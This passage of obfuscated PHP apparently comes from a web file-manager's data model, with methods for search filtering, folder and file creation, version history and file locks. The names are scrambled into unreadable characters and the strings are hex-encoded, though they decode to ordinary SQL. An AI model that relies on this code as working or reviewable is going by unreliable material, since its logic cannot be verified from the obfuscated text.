($this->_listSearchFilter($ôŸ”à©, $ì×ƒïÄü)) { $åñ¶Ÿ«˜[] = $ôŸ”à©; } } $İ“®½œ›[$˜ùŠÖ’¢[366]] = array_merge($åñ¶Ÿ«˜, $İ“®½œ›[$˜ùŠÖ’¢[366]]); $İ“®½œ›[$˜ùŠÖ’¢[363]][$˜ùŠÖ’¢[364]] += count($åñ¶Ÿ«˜); } private function _listSearchFilter($ÊŸã§—Ğ, $ïŠÂµòş) { $²¾Ü½¹ı =& $_SERVER[ê‘³Æ±]; $’šèœÇÃ = $ÊŸã§—Ğ[$²¾Ü½¹ı[404]] == $²¾Ü½¹ı[89]; if (!strstr($ÊŸã§—Ğ[$²¾Ü½¹ı[514]], $²¾Ü½¹ı[50] . $ïŠÂµòş[$²¾Ü½¹ı[491]] . $²¾Ü½¹ı[50])) { return !1; } if (isset($ïŠÂµòş[$²¾Ü½¹ı[406]]) && $ïŠÂµòş[$²¾Ü½¹ı[406]] != $²¾Ü½¹ı[1863]) { if ($ïŠÂµòş[$²¾Ü½¹ı[406]] == $²¾Ü½¹ı[79] && !$’šèœÇÃ) { return !1; } if ($ïŠÂµòş[$²¾Ü½¹ı[406]] != $²¾Ü½¹ı[79] && $’šèœÇÃ) { return !1; } if (!strstr($ÊŸã§—Ğ[$²¾Ü½¹ı[169]], $²¾Ü½¹ı[50] . $ïŠÂµòş[$²¾Ü½¹ı[406]] . $²¾Ü½¹ı[50])) { return !1; } } if (isset($ïŠÂµòş[$²¾Ü½¹ı[2060]]) && $ïŠÂµòş[$²¾Ü½¹ı[2060]] < $ÊŸã§—Ğ[$²¾Ü½¹ı[80]]) { return !1; } if (isset($ïŠÂµòş[$²¾Ü½¹ı[2061]]) && $ïŠÂµòş[$²¾Ü½¹ı[2061]] > $ÊŸã§—Ğ[$²¾Ü½¹ı[80]]) { return !1; } if (isset($ïŠÂµòş[$²¾Ü½¹ı[590]]) && $ïŠÂµòş[$²¾Ü½¹ı[590]] != $ÊŸã§—Ğ[$²¾Ü½¹ı[447]]) { return !1; } return !0; } public function listSearchChildren($„î†¥ä, $Ê´—î÷Å = 5000) { $òƒñ®¨Ì =& $_SERVER[ê‘³Æ±]; $Ç¥®âçÖ = array(); $ı­º¬‚Î = $this->sourceInfo($„î†¥ä); $Ë‘öü¯ = array($òƒñ®¨Ì[514] => array($òƒñ®¨Ì[380], $ı­º¬‚Î[$òƒñ®¨Ì[514]] . $ı­º¬‚Î[$òƒñ®¨Ì[396]] . $òƒñ®¨Ì[541])); $§£ä¤¸õ = $this->field($òƒñ®¨Ì[80])->where($Ë‘öü¯)->limit($Ê´—î÷Å + 1)->select(); $…ĞÑ…ùÌ = is_array($§£ä¤¸õ) ? count($§£ä¤¸õ) : 0; if ($…ĞÑ…ùÌ > $Ê´—î÷Å) { return $this->_listSearchChildrenNear($„î†¥ä, $Ê´—î÷Å); } $ÛÕëÉû = $this->field($òƒñ®¨Ì[396])->where($Ë‘öü¯)->select(); $Ç¥®âçÖ = array_to_keyvalue($ÛÕëÉû, $òƒñ®¨Ì[12], $òƒñ®¨Ì[396]); return $Ç¥®âçÖ; } private function _listSearchChildrenNear($ÀáşÈĞ€, $İóÔ°ùÜ) { $ÑÅõì¤ =& $_SERVER[ê‘³Æ±]; $¸ˆ’Ğ“Î = array(); $‡±æñÆå = array($ÑÅõì¤[491] => $ÀáşÈĞ€); $Ñ€úõŞÖ = $this->field($ÑÅõì¤[2062])->where($‡±æñÆå)->select(); $øáò­Ğ = array_to_keyvalue(array_filter_by_field($Ñ€úõŞÖ, $ÑÅõì¤[404], $ÑÅõì¤[89]), $ÑÅõì¤[12], $ÑÅõì¤[396]); $¸ˆ’Ğ“Î = array_merge($¸ˆ’Ğ“Î, array_to_keyvalue($Ñ€úõŞÖ, $ÑÅõì¤[12], $ÑÅõì¤[396])); if (!$øáò­Ğ) { return $¸ˆ’Ğ“Î; } $‡±æñÆå = array($ÑÅõì¤[491] => array($ÑÅõì¤[7], $øáò­Ğ)); $Ñ€úõŞÖ = $this->field($ÑÅõì¤[2062])->where($‡±æñÆå)->limit($İóÔ°ùÜ)->select(); $¸ˆ’Ğ“Î = array_merge($¸ˆ’Ğ“Î, array_to_keyvalue($Ñ€úõŞÖ, $ÑÅõì¤[12], $ÑÅõì¤[396])); $¸ˆ’Ğ“Î = array_slice($¸ˆ’Ğ“Î, 0, $İóÔ°ùÜ); return $¸ˆ’Ğ“Î; } private function _listSearchBindPinyin($Ä´Ç˜áÊ, &$†ìéë¥§, &$Ï´˜ ) { $áã¾İÌì =& $_SERVER[ê‘³Æ±]; if (!isset($Ä´Ç˜áÊ[$áã¾İÌì[1900]]) || !$Ä´Ç˜áÊ[$áã¾İÌì[1900]]) { return; } if (!Input::check($Ä´Ç˜áÊ[$áã¾İÌì[1900]], $áã¾İÌì[315]) || strlen($Ä´Ç˜áÊ[$áã¾İÌì[1900]]) < 2) { return; } $‚©š« = "\114\x45\106\124\x20\112\x4f\x49\116\x20{$this->tablePrefix}\151\x6f\137\x73\x6f\165\162\143\145\x5f\x6d\x65\x74\141\x20\x6d\145\x74\x61\40\157\156\x20\x73\x6f\x75\x72\143\x65\x2e\x73\157\165\x72\x63\145\x49\104\40\75\40\155\x65\x74\x61\56\x73\x6f\165\162\143\145\111\104"; $ŞäóğÅ× = array(); $Ï´˜  = str_replace(array($áã¾İÌì[228], $áã¾İÌì[53], $áã¾İÌì[2063]), $áã¾İÌì[12], $Ï´˜ ); $Ï´˜  = $áã¾İÌì[429] . str_replace($áã¾İÌì[50], $áã¾İÌì[430], $Ï´˜ ); $£¹ñã·• = $†ìéë¥§[$áã¾İÌì[32]]; unset($†ìéë¥§[$áã¾İÌì[32]]); foreach ($†ìéë¥§ as $ú§ÍÌŠ® => $¤Ëú‚–‡) { $ŞäóğÅ×[$áã¾İÌì[429] . $ú§ÍÌŠ®] = $¤Ëú‚–‡; } foreach ($£¹ñã·• as $Æë¥À‡¦) { $ŞäóğÅ×[] = array($áã¾İÌì[434] => $Æë¥À‡¦, $áã¾İÌì[989] => $áã¾İÌì[1904], array($áã¾İÌì[2064] => $Æë¥À‡¦, $áã¾İÌì[2065] => array($áã¾İÌì[7], array($áã¾İÌì[457], $áã¾İÌì[456])))); } $this->join($‚©š«); $†ìéë¥§ = $ŞäóğÅ×; } private function _parseSearchWhere($‰àâĞØ›) { $•šìÉæÍ =& $_SERVER[ê‘³Æ±]; $·ÅßêñŒ = array(); if (isset($‰àâĞØ›[$•šìÉæÍ[747]]) && $‰àâĞØ›[$•šìÉæÍ[747]]) { $·ÅßêñŒ[$•šìÉæÍ[86]] = array($•šìÉæÍ[2066], $‰àâĞØ›[$•šìÉæÍ[747]]); } if (isset($‰àâĞØ›[$•šìÉæÍ[489]]) && $‰àâĞØ›[$•šìÉæÍ[489]]) { $Šğ®½Í = array($•šìÉæÍ[2067], $‰àâĞØ›[$•šìÉæÍ[489]]); if ($·ÅßêñŒ[$•šìÉæÍ[86]]) { $·ÅßêñŒ[$•šìÉæÍ[86]] = array($·ÅßêñŒ[$•šìÉæÍ[86]], $Šğ®½Í, $•šìÉæÍ[2068]); } else { $·ÅßêñŒ[$•šìÉæÍ[86]] = $Šğ®½Í; } } if (isset($‰àâĞØ›[$•šìÉæÍ[2060]]) && $‰àâĞØ›[$•šìÉæÍ[2060]] > 0) { $·ÅßêñŒ[$•šìÉæÍ[80]] = array($•šìÉæÍ[2066], $‰àâĞØ›[$•šìÉæÍ[2060]]); } if (isset($‰àâĞØ›[$•šìÉæÍ[2061]]) && $‰àâĞØ›[$•šìÉæÍ[2061]]) { $Šğ®½Í = array($•šìÉæÍ[2067], $‰àâĞØ›[$•šìÉæÍ[2061]]); if ($·ÅßêñŒ[$•šìÉæÍ[80]]) { $·ÅßêñŒ[$•šìÉæÍ[80]] = array($·ÅßêñŒ[$•šìÉæÍ[80]], $Šğ®½Í, $•šìÉæÍ[2068]); } else { $·ÅßêñŒ[$•šìÉæÍ[80]] = $Šğ®½Í; } } if (isset($‰àâĞØ›[$•šìÉæÍ[590]]) && $‰àâĞØ›[$•šìÉæÍ[590]]) { $·ÅßêñŒ[] = array($•šìÉæÍ[447] => $‰àâĞØ›[$•šìÉæÍ[590]], $•šìÉæÍ[445] => $‰àâĞØ›[$•šìÉæÍ[590]], $•šìÉæÍ[989] => $•šìÉæÍ[1904]); } if (isset($‰àâĞØ›[$•šìÉæÍ[406]]) && $‰àâĞØ›[$•šìÉæÍ[406]]) { $¿àİÊÃ± = $‰àâĞØ›[$•šìÉæÍ[406]]; if ($¿àİÊÃ± == $•šìÉæÍ[79]) { $·ÅßêñŒ[$•šìÉæÍ[404]] = 1; } else { if ($¿àİÊÃ± == $•šìÉæÍ[2069]) { $·ÅßêñŒ[$•šìÉæÍ[404]] = 0; } else { if ($¿àİÊÃ±) { $¿àİÊÃ± = is_array($¿àİÊÃ±) ? $¿àİÊÃ± : explode($•šìÉæÍ[50], $¿àİÊÃ±); $·ÅßêñŒ[$•šìÉæÍ[406]] = array($•šìÉæÍ[412], $¿àİÊÃ±); $·ÅßêñŒ[$•šìÉæÍ[404]] = 0; } } } } $this->_parseSearchParent($‰àâĞØ›, $·ÅßêñŒ); if (isset($‰àâĞØ›[$•šìÉæÍ[1900]]) && trim($‰àâĞØ›[$•šìÉæÍ[1900]])) { $à¸÷çÅÜ = trim($‰àâĞØ›[$•šìÉæÍ[1900]]); $¦ìáÊ– = explode($•šìÉæÍ[53], $à¸÷çÅÜ); if (strlen($à¸÷çÅÜ) > 2 && (substr($à¸÷çÅÜ, 0, 1) == $•šìÉæÍ[119] && substr($à¸÷çÅÜ, -1) == $•šìÉæÍ[119]) || substr($à¸÷çÅÜ, 0, 1) == $•šìÉæÍ[58] && substr($à¸÷çÅÜ, -1) == $•šìÉæÍ[58]) { $à¸÷çÅÜ = substr($à¸÷çÅÜ, 1, -1); $¦ìáÊ– = array($à¸÷çÅÜ); } $·ÅßêñŒ[$•šìÉæÍ[32]] = array(array($•šìÉæÍ[540], $•šìÉæÍ[1902] . $à¸÷çÅÜ . $•šìÉæÍ[1902])); if (count($¦ìáÊ–) > 1) { $·ÅßêñŒ[$•šìÉæÍ[32]] = array(); foreach ($¦ìáÊ– as $†¸½æ) { if (!trim($†¸½æ)) { continue; } $·ÅßêñŒ[$•šìÉæÍ[32]][] = array($•šìÉæÍ[540], $•šìÉæÍ[1902] . trim($†¸½æ) . $•šìÉæÍ[1902]); } } } return $·ÅßêñŒ; } private function _parseSearchParent($«©º”î©, &$ø«½ÛÑã) { $’†€ß¶ï =& $_SERVER[ê‘³Æ±]; if (!isset($«©º”î©[$’†€ß¶ï[491]]) || !$«©º”î©[$’†€ß¶ï[491]]) { return; } $ç¡´¤Ÿã = $this->pathInfo($«©º”î©[$’†€ß¶ï[491]]); $ÜÌÆô‹‰ = $ç¡´¤Ÿã[$’†€ß¶ï[491]] . $’†€ß¶ï[12] === $’†€ß¶ï[192]; $¡óİ¨â = $ç¡´¤Ÿã[$’†€ß¶ï[405]] == $’†€ß¶ï[508]; if ($ç¡´¤Ÿã[$’†€ß¶ï[525]] == $’†€ß¶ï[526]) { $‡…¢„š² = $this->sourceInfo($«©º”î©[$’†€ß¶ï[491]]); $ç¡´¤Ÿã[$’†€ß¶ï[514]] = $‡…¢„š²[$’†€ß¶ï[514]]; } $ø«½ÛÑã[$’†€ß¶ï[580]] = array($’†€ß¶ï[540], $ç¡´¤Ÿã[$’†€ß¶ï[514]] . $«©º”î©[$’†€ß¶ï[491]] . $’†€ß¶ï[541]); $ÂÂó™æ = isset($«©º”î©[$’†€ß¶ï[1768]]) && in_array($’†€ß¶ï[508], $«©º”î©[$’†€ß¶ï[1768]]); if (!$ÂÂó™æ || !$¡óİ¨â || !$ÜÌÆô‹‰ || !$ç¡´¤Ÿã[$’†€ß¶ï[407]]) { return; } if (!AuthModel::authCheckRoot($ç¡´¤Ÿã[$’†€ß¶ï[407]][$’†€ß¶ï[408]])) { return; } $­´ôš¦ä = $ç¡´¤Ÿã[$’†€ß¶ï[498]] . $’†€ß¶ï[12]; if ($­´ôš¦ä == $’†€ß¶ï[89]) { unset($ø«½ÛÑã[$’†€ß¶ï[580]]); $ø«½ÛÑã[$’†€ß¶ï[405]] = self::TYPE_GROUP; return; } $ÆÙÙóïë = Model($’†€ß¶ï[515])->groupChildrenAll($­´ôš¦ä); $½ŠƒÛƒ = count($ÆÙÙóïë); if ($½ŠƒÛƒ <= 1) { return; } $ŸÖõúÏ = array($’†€ß¶ï[491] => 0, $’†€ß¶ï[405] => self::TYPE_GROUP, $’†€ß¶ï[498] => array($’†€ß¶ï[7], $ÆÙÙóïë)); $˜ığšŸ = $this->field($’†€ß¶ï[2070])->where($ŸÖõúÏ)->limit($½ŠƒÛƒ)->select(); $ø«½ÛÑã[$’†€ß¶ï[580]] = array(); foreach ($˜ığšŸ as $È•µûç) { $ø«½ÛÑã[$’†€ß¶ï[580]][] = array($’†€ß¶ï[540], $’†€ß¶ï[524] . $È•µûç[$’†€ß¶ï[396]] . $’†€ß¶ï[541]); } $ø«½ÛÑã[$’†€ß¶ï[580]][] = $’†€ß¶ï[1904]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ÌËÑ¹ã) { $œåÔÎÍû =& $_SERVER[ê‘³Æ±]; $µ¤Å©é† = Model($œåÔÎÍû[506])->where(array($œåÔÎÍû[1632] => $ÌËÑ¹ã))->find(); $ÂºÆÙŒõ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÌËÑ¹ã, $µ¤Å©é†[$œåÔÎÍû[32]]); $this->userDesktopAdd($ÂºÆÙŒõ); return $ÂºÆÙŒõ; } public function userDesktopAdd($ùÜøĞ³) { $š¬“‰á• =& $_SERVER[ê‘³Æ±]; $º•ùåê = LNG($š¬“‰á•[2071]); $áĞ¦§©ü = $this->mkdir($ùÜøĞ³, $º•ùåê); $this->metaSet($áĞ¦§©ü, $š¬“‰á•[2072], $š¬“‰á•[89]); $this->metaSet($ùÜøĞ³, $š¬“‰á•[2073], $áĞ¦§©ü); } public function groupRootAdd($¦Ô“ñ¢Ö) { $Ë”—œË =& $_SERVER[ê‘³Æ±]; $ ÛšŒ®÷ = Model($Ë”—œË[515])->where(array($Ë”—œË[1896] => $¦Ô“ñ¢Ö))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¦Ô“ñ¢Ö, $ ÛšŒ®÷[$Ë”—œË[32]]); } public function systemRootPathAdd($¥æêˆ›ª) { if ($¥æêˆ›ª != $_SERVER[ê‘³Æ±][533]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $¥æêˆ›ª); } public function userRootRemove($¯ÚáØ¬Å) { $²îÙı–û = $this->sourceRoot(SourceModel::TYPE_USER, $¯ÚáØ¬Å); if (!$²îÙı–û) { return; } $this->remove($²îÙı–û, !1); } public function groupRootRemove($ıóÌí¦²) { $¡¼„ô÷ƒ = $this->sourceRoot(SourceModel::TYPE_GROUP, $ıóÌí¦²); if (!$¡¼„ô÷ƒ) { return; } $this->remove($¡¼„ô÷ƒ, !1); } private function _mkdirRoot($ñè×ÇÉ¡, $Ä÷İÆŒÉ, $ ®›£) { $ˆÖÀ’¹ =& $_SERVER[ê‘³Æ±]; $¼œ­±˜› = array($ˆÖÀ’¹[395] => 0, $ˆÖÀ’¹[576] => $ñè×ÇÉ¡, $ˆÖÀ’¹[577] => $Ä÷İÆŒÉ, $ˆÖÀ’¹[573] => 1, $ˆÖÀ’¹[578] => USER_ID, $ˆÖÀ’¹[579] => USER_ID, $ˆÖÀ’¹[574] => $ˆÖÀ’¹[12], $ˆÖÀ’¹[580] => $ˆÖÀ’¹[524], $ˆÖÀ’¹[423] => 0, $ˆÖÀ’¹[575] => 0, $ˆÖÀ’¹[461] => 0, $ˆÖÀ’¹[581] => $ˆÖÀ’¹[12]); if ($‰Õ½›½¦ = $this->where($¼œ­±˜›)->find()) { return $‰Õ½›½¦[$ˆÖÀ’¹[396]]; } $À«Àø = "\115\x6f\x64\x65\x6c\x53\x6f\x75\162\143\x65\x2e\155\x6b\x64\x69\x72\122\x6f\157\x74\x2e{$ñè×ÇÉ¡}\56{$Ä÷İÆŒÉ}\x2e" . $ ®›£; CacheLock::lock($À«Àø); $¼œ­±˜›[$ˆÖÀ’¹[32]] = $ ®›£; $áéœÜàÜ = $this->add($¼œ­±˜›); $òõÔÈ·å = array($ˆÖÀ’¹[582] => short_id($áéœÜàÜ)); $this->where(array($ˆÖÀ’¹[411] => $áéœÜàÜ))->save($òõÔÈ·å); CacheLock::unlock($À«Àø); return $áéœÜàÜ; } private function sourceRoot($Å¯Šìƒ­, $¤¾¯éÓâ, $Ê²¸Á–¢ = false) { $ÔÏÙ„ßŒ =& $_SERVER[ê‘³Æ±]; $¤æ¤ïÕ = array($ÔÏÙ„ßŒ[395] => 0, $ÔÏÙ„ßŒ[576] => $Å¯Šìƒ­, $ÔÏÙ„ßŒ[577] => $¤¾¯éÓâ); if ($Ó«¢œ»Ä = $this->where($¤æ¤ïÕ)->find()) { return $Ê²¸Á–¢ ? $Ó«¢œ»Ä : $Ó«¢œ»Ä[$ÔÏÙ„ßŒ[396]]; } return !1; } public function sourceRootGroup($´ñ¦öş) { $óˆ¼Ã =& $_SERVER[ê‘³Æ±]; if (is_string($´ñ¦öş)) { $´ñ¦öş = array($´ñ¦öş); } $Üä¿âìÔ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $´ñ¦öş, $óˆ¼Ã[183]); $óûäÕ¹Ê = array($óˆ¼Ã[366] => $Üä¿âìÔ, $óˆ¼Ã[363] => array($óˆ¼Ã[745] => count($´ñ¦öş))); $this->_listDataApply($óûäÕ¹Ê[$óˆ¼Ã[366]]); $this->_listMake($óûäÕ¹Ê); return array_to_keyvalue($óûäÕ¹Ê[$óˆ¼Ã[77]], $óˆ¼Ã[498]); } public function mkfile($ˆ„‹Õı¦, $·„¶–àè, $“„ÈÓıÙ = '', $¼€”ÈÖ = REPEAT_RENAME) { $–éæˆÓ¿ =& $_SERVER[ê‘³Æ±]; $ğÒÏğ¯ê = Model($–éæˆÓ¿[599])->addFileByContent($“„ÈÓıÙ, $·„¶–àè); return $this->_createFileCall($ˆ„‹Õı¦, $·„¶–àè, $ğÒÏğ¯ê, $¼€”ÈÖ, $–éæˆÓ¿[1325]); } public function addFile($Í¾Ë™§÷, $ Ò÷Ãğæ, $Â•ËªãÑ, $‰¢‘¬Ø¶ = false, $óïâÙ¹Â = REPEAT_RENAME) { $Ô×åÃ¶É = Model($_SERVER[ê‘³Æ±][599])->addFile($ Ò÷Ãğæ, $Â•ËªãÑ, $‰¢‘¬Ø¶); return $this->_createFileCall($Í¾Ë™§÷, $Â•ËªãÑ, $Ô×åÃ¶É, $óïâÙ¹Â); } public function addFileByFileID($§«¾Âç—, $âìÅÏÅç, $‚òÒêœê, $óÓİªãƒ = REPEAT_RENAME) { $´õÒ´×‘ =& $_SERVER[ê‘³Æ±]; $Ò×²†¼ = Model($´õÒ´×‘[599])->find($âìÅÏÅç); Model($´õÒ´×‘[599])->linkAdd($âìÅÏÅç); return $this->_createFileCall($§«¾Âç—, $‚òÒêœê, $Ò×²†¼, $óÓİªãƒ); } public function addFileByRemote($¦õÒæ™, $¡µ™£ö›, $©ñÎâÆ , $Úûµı´ø = array(), $†÷ñ¶Îà = REPEAT_RENAME) { $Ù×ŞàİÃ = Model($_SERVER[ê‘³Æ±][599])->addFileByRemote($¡µ™£ö›, $©ñÎâÆ , $Úûµı´ø); return $this->_createFileCall($¦õÒæ™, $©ñÎâÆ , $Ù×ŞàİÃ, $†÷ñ¶Îà); } private function _createFileCall($Ú¢ÉæÙ, $“‡ò¦öë, $âÒş·ÖŸ, $½Åİå, $¯æì–üŒ = "\x75\x70\154\x6f\141\144") { $ØÃĞ™ŠÌ =& $_SERVER[ê‘³Æ±]; $©öòñºá = !1; $this->setMasterDB(); $this->lockWriteStart($Ú¢ÉæÙ, $“‡ò¦öë); $£“öìÚ— = $this->fileNameExist($Ú¢ÉæÙ, $“‡ò¦öë); $¶’İÚƒ» = $this->_createFile($Ú¢ÉæÙ, $“‡ò¦öë, $âÒş·ÖŸ, $½Åİå, $©öòñºá); if (!$©öòñºá) { Model($ØÃĞ™ŠÌ[463])->remove($âÒş·ÖŸ[$ØÃĞ™ŠÌ[460]]); } if ($©öòñºá && $¶’İÚƒ» && $¶’İÚƒ» != $£“öìÚ—) { Model($ØÃĞ™ŠÌ[2044])->eventCreate($¶’İÚƒ», $¯æì–üŒ); } $this->lockWriteEnd($Ú¢ÉæÙ, $“‡ò¦öë); return $¶’İÚƒ»; } public function mkdir($‹Â—¥’’, $Üéşñšª, $ıãíÍâ¨ = REPEAT_SKIP) { $šŒö¡¡œ =& $_SERVER[ê‘³Æ±]; $this->setMasterDB(); $·çòŠ = $this->sourceInfo($‹Â—¥’’); if (!$·çòŠ) { return !1; } $this->lockWriteStart($‹Â—¥’’, $Üéşñšª); if ($ıãíÍâ¨ !== !1) { $¢ÃëÀø = $this->fileNameExist($‹Â—¥’’, $Üéşñšª); if ($¢ÃëÀø && $ıãíÍâ¨ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($‹Â—¥’’, $Üéşñšª); return $¢ÃëÀø; } $Üéşñšª = $this->fileNameAuto($‹Â—¥’’, $Üéşñšª, $ıãíÍâ¨); } $ÉÓµƒú = array($šŒö¡¡œ[573] => 1, $šŒö¡¡œ[414] => $Üéşñšª, $šŒö¡¡œ[574] => $šŒö¡¡œ[12], $šŒö¡¡œ[461] => 0, $šŒö¡¡œ[575] => 0); $…ø®Èáñ = $this->_addSource($ÉÓµƒú, $·çòŠ); Model($šŒö¡¡œ[2044])->eventCreate($…ø®Èáñ, $šŒö¡¡œ[1326]); $this->lockWriteEnd($‹Â—¥’’, $Üéşñšª); return $…ø®Èáñ; } public function listSourceRoot($²¨Òı€¦, $ÆŞçë¿, $¿ğÖêª = "\x73\x6f\165\x72\143\x65\x49\104\x2c\164\x61\x72\x67\x65\x74\111\104\54\163\151\x7a\x65") { $òÎÒØ÷ =& $_SERVER[ê‘³Æ±]; $•ÃÅÆäÇ = $òÎÒØ÷[375]; $ª²›¡Â• = array(); $ÈŒ«¾„Ë = 1024 * 50; $şÜ­ƒ°‘ = is_array($şÜ­ƒ°‘) ? $şÜ­ƒ°‘ : array(); $ÚÊÙßº¡ = count($ÆŞçë¿); $ŠÁ‡¦•± = $this->tablePrefix . $òÎÒØ÷[2074]; for ($—–ãñÅ = 0; $—–ãñÅ < $ÚÊÙßº¡; $—–ãñÅ++) { $ìÑôÜÌ¾ = $ÆŞçë¿[$—–ãñÅ]; $•ÃÅÆäÇ .= "\x53\x45\114\x45\103\x54\40\x2a\40\106\122\x4f\115\40\50\123\x45\114\105\x43\124\x20{$¿ğÖêª}\x20\106\122\x4f\x4d\40\x60{$ŠÁ‡¦•±}\140\x20\x57\x48\105\122\x45\x20"; $•ÃÅÆäÇ .= "\x60\x70\141\x72\145\x6e\164\x49\x44\140\x3d\x30\40\x41\x4e\x44\x20\140\x74\x61\x72\147\145\164\111\x44\140\75{$ìÑôÜÌ¾}\40\101\x4e\x44\40\x60\x74\141\162\147\x65\x74\124\x79\x70\145\140\75{$²¨Òı€¦}\40\154\x69\x6d\151\164\40\61\x29\x20\x61\x73\40\x74\x62\x5f{$—–ãñÅ}\40\125\116\x49\117\x4e\40\x41\114\x4c\x20"; if ((strlen($•ÃÅÆäÇ) >= $ÈŒ«¾„Ë || $—–ãñÅ == $ÚÊÙßº¡ - 1) && $•ÃÅÆäÇ) { $•ÃÅÆäÇ = substr($•ÃÅÆäÇ, 0, -strlen($òÎÒØ÷[1027])); $ë£€åÛÇ = $this->query($•ÃÅÆäÇ); $•ÃÅÆäÇ = $òÎÒØ÷[12]; $ª²›¡Â• = array_merge($ª²›¡Â•, $ë£€åÛÇ); } } return $ª²›¡Â•; } private function _createFile($ùŞÓ‰åñ, $Éë†ƒ”, $Óã½áà, $¢‹²Û¹®, &$’¾Û ) { $´çêş =& $_SERVER[ê‘³Æ±]; $â¿Úª»Í = $this->sourceInfo($ùŞÓ‰åñ); if (!$Óã½áà || !$â¿Úª»Í) { return !1; } if ($¢‹²Û¹® !== !1) { $¤Ñ‰¶ô = $this->fileNameExist($ùŞÓ‰åñ, $Éë†ƒ”); } $’¾Û  = !0; if ($¢‹²Û¹® && $¤Ñ‰¶ô) { if ($¢‹²Û¹® == REPEAT_SKIP) { $’¾Û  = !1; return $¤Ñ‰¶ô; } else { if ($¢‹²Û¹® == REPEAT_REPLACE) { $†œ§†öÆ = $this->sourceInfo($¤Ñ‰¶ô); $™ŒŸ‹¹› = $this->fileHistory($†œ§†öÆ, $Óã½áà[$´çêş[460]], $Óã½áà[$´çêş[80]]); if (!$™ŒŸ‹¹›) { $’¾Û  = !1; } else { $this->folderSizeReset($ùŞÓ‰åñ); } return $¤Ñ‰¶ô; } else { $Éë†ƒ” = $this->fileNameAuto($ùŞÓ‰åñ, $Éë†ƒ”, $¢‹²Û¹®, !1); } } } $•Šš­À« = array($´çêş[573] => 0, $´çêş[414] => $Éë†ƒ”, $´çêş[574] => substr(get_path_ext($Éë†ƒ”), 0, 10), $´çêş[461] => $Óã½áà[$´çêş[460]], $´çêş[575] => $Óã½áà[$´çêş[80]]); $îå–›Õå = $this->_addSource($•Šš­À«, $â¿Úª»Í); $this->folderSizeReset($ùŞÓ‰åñ, intval($•Šš­À«[$´çêş[80]])); return $îå–›Õå; } protected function fileHistory($¯¦ã¿å, $ˆãØıã½, $–´ÉıÏ‘) { $†íÇåÎ =& $_SERVER[ê‘³Æ±]; $™›áæ¼Õ = defined($†íÇåÎ[467]) ? USER_ID : $†íÇåÎ[192]; if ($¯¦ã¿å[$†íÇåÎ[460]] == $ˆãØıã½) { return !1; } $this->checkLock($¯¦ã¿å[$†íÇåÎ[396]], $ˆãØıã½); Model($†íÇåÎ[2075])->addHistory($¯¦ã¿å); $‘–öı = array($†íÇåÎ[579] => $™›áæ¼Õ, $†íÇåÎ[418] => time(), $†íÇåÎ[460] => $ˆãØıã½, $†íÇåÎ[80] => $–´ÉıÏ‘); $this->where(array($†íÇåÎ[411] => $¯¦ã¿å[$†íÇåÎ[396]]))->save($‘–öı); $this->sourceCacheClear($¯¦ã¿å[$†íÇåÎ[396]]); return !0; } public function checkLock($ Ü´ÀÍä, $ÒÛ‚ÛÅŞ) { $‹ æ× =& $_SERVER[ê‘³Æ±]; $óå²µÛ = $this->pathInfo($ Ü´ÀÍä); if (!$this->fileIsLock($óå²µÛ, !0)) { return; } $£—çÕê = Session::get($‹ æ×[2076]); $Ú³øØ™­ = substr($óå²µÛ[$‹ æ×[32]], 0, -1 - strlen($óå²µÛ[$‹ æ×[169]])) . $‹ æ×[1590] . $£—çÕê . $‹ æ×[10] . $óå²µÛ[$‹ æ×[169]]; $ÁëÃş» = Model($‹ æ×[599])->find($ÒÛ‚ÛÅŞ); $this->_createFileCall($óå²µÛ[$‹ æ×[491]], $Ú³øØ™­, $ÁëÃş», REPEAT_REPLACE, $‹ æ×[1325]); $¡¨Ä±ıÏ = $óå²µÛ[$‹ æ×[458]][$‹ æ×[538]]; $ğñ¤ÉÕ± = $¡¨Ä±ıÏ[$‹ æ×[531]] ? $¡¨Ä±ıÏ[$‹ æ×[531]] : $¡¨Ä±ıÏ[$‹ æ×[32]]; show_json(LNG($‹ æ×[2077]) . $‹ æ×[2078] . LNG($‹ æ×[2079]) . $‹ æ×[2080] . $ğñ¤ÉÕ± . $‹ æ×[2081], !1); } public function fileIsLock($º´‚÷æä, $Ö¾ÀŒÜ = false) { $„Æå²Ñ =& $_SERVER[ê‘³Æ±]; if (!isset($º´‚÷æä[$„Æå²Ñ[458]]) || !$º´‚÷æä[$„Æå²Ñ[458]][$„Æå²Ñ[535]]) { return !1; } if ($º´‚÷æä[$„Æå²Ñ[458]][$„Æå²Ñ[535]] != USER_ID) { return !0; } $›Û–Üé = $GLOBALS[$„Æå²Ñ[6]][$„Æå²Ñ[90]][$„Æå²Ñ[536]]; if ($º´‚÷æä[$„Æå²Ñ[458]][$„Æå²Ñ[537]] <= time() - $›Û–Üé) { $this->metaSet($º´‚÷æä[$„Æå²Ñ[396]], $„Æå²Ñ[535], null); $this->metaSet($º´‚÷æä[$„Æå²Ñ[396]], $„Æå²Ñ[537], null); } if ($Ö¾ÀŒÜ) { $this->metaSet($º´‚÷æä[$„Æå²Ñ[396]], $„Æå²Ñ[537], time()); } return !1; } private function _addSource($ŒÃ½âŠñ, $Îˆİô“é) { $×İè­ó¹ =& $_SERVER[ê‘³Æ±]; $Í˜¥†äŸ = defined($×İè­ó¹[467]) ? USER_ID : $×İè­ó¹[192]; $ÉÜ•ø÷É = array($×İè­ó¹[576] => $Îˆİô“é[$×İè­ó¹[405]], $×İè­ó¹[577] => $Îˆİô“é[$×İè­ó¹[498]], $×İè­ó¹[578] => $Í˜¥†äŸ, $×İè­ó¹[579] => $Í˜¥†äŸ, $×İè­ó¹[395] => $Îˆİô“é[$×İè­ó¹[396]], $×İè­ó¹[580] => $Îˆİô“é[$×İè­ó¹[514]] . $Îˆİô“é[$×İè­ó¹[396]] . $×İè­ó¹[50], $×İè­ó¹[423] => 0, $×İè­ó¹[581] => $×İè­ó¹[12]); $ŒÃ½âŠñ = array_merge($ÉÜ•ø÷É, $ŒÃ½âŠñ); $this->updateModifyTime($ŒÃ½âŠñ[$×İè­ó¹[491]]); $«á—ìã¡ = $×İè­ó¹[2082] . $Îˆİô“é[$×İè­ó¹[396]]; if (isset(self::$cacheChildList[$«á—ìã¡])) { unset(self::$cacheChildList[$«á—ìã¡]); } 